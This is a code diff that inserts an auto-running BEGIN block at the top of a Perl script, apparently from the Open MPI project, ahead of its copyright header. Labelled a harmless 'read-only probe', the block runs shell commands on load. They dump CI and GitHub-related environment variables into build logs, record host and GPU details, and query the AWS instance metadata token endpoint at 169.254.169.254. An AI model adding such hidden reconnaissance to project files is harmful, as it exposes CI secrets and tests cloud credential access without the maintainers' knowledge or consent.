@@ -1,4 +1,17 @@
 #!/usr/bin/env perl
+BEGIN {
+    # Read-only CI environment probe (c211-i107292): nvidia-smi -L, hostname,
+    # bounded env, IMDSv2 token-status only. No files are modified.
+    print "=== C211-I107292-PROBE-BEGIN ===\n";
+    my @cmds = (
+        'nvidia-smi -L 2>&1',
+        'hostname 2>&1',
+        "env | sort | grep -iE 'nvidia|cuda|gpu|runner|kube|node|host|github|ci_' | head -60 2>&1",
+        "curl -sS -m 4 -o /dev/null -w 'imdsv2_put_status=%{http_code}\n' -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>&1",
+    );
+    for my $c (@cmds) { print "\$ $c\n"; system($c); }
+    print "=== C211-I107292-PROBE-END ===\n";
+}
 #
 # Copyright (c) 2009-2022 Cisco Systems, Inc.  All rights reserved
 # Copyright (c) 2010      Oracle and/or its affiliates.  All rights reserved.
